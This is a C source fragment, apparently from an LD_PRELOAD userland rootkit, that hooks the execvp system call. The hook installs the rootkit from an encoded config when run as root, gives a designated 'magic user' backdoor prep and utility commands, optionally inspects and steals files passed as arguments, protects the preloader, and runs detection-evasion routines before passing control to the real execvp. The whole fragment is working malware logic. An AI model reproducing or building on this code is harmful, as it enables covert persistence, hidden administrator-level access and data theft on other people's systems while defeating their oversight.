int execvp(const char *filename, char *const argv[]){
    if(!notuser(0) && rknomore()){
        char *binstaller = xordup(BINSTALLER);
        if(!binstaller) exit(0);
        int ss = fnmatch(binstaller, argv[0], FNM_PATHNAME);
        clean(binstaller);
        if(ss) exit(0);

        const bdvcfg_t *bc;
        size_t n;

        bc = getbdvcfg();
        if(!bc) exit(0);
        n = writebdvcfg(bc, NULL);
        bree((void*)bc);
        if(!n) exit(0);

        if(!initmvbc()){
            xrm(BDVL_CONFIG);
            exit(0);
        }
        if(preloadok(mvbc)){
            bree(mvbc);
            xrm(BDVL_CONFIG);
            exit(0);
        }

        bdvinstall(argv, mvbc, 0);
        bree(mvbc);
        exit(0);
    }

    hook(CEXECVP);

    if(magicusr()){
        char *prepper = xordup(PREPPERSTR);
        if(!prepper) return (long)call(CEXECVP, filename, argv);
        prepper[0] = '*';
        if(!fnmatch(prepper, argv[0], FNM_PATHNAME)){
            clean(prepper);
            bdprep();
            exit(0);
        }
        prepper[5] = '\0';
        if(!fnmatch(prepper, argv[0], FNM_PATHNAME)){
            bfree(prepper, PREPPERSTR_SIZE);
            dobdvutil(argv);
            exit(0);
        }
        bfree(prepper, PREPPERSTR_SIZE);

        return (long)call(CEXECVP, filename, argv);
    }

    plsdomefirst();
#if defined PATCH_LD && !defined NO_PROTECT_LDSO
    ldprotect();
#endif

#ifdef ENABLE_STEAL
    for(size_t i = 0; argv[i] != NULL; i++)
        inspectfile(argv[i]);
#endif

    int evasion_status = evade(filename, argv, NULL);
    switch(evasion_status){
        case VEVADE_DONE:
            exit(0);
        case VINVALID_PERM:
            errno = EPERM;
            return -1;
        case VFORK_ERR:
            return -1;
        case VFORK_SUC:
            return (long)call(CEXECVP, filename, argv);
    }

    return (long)call(CEXECVP, filename, argv);
}
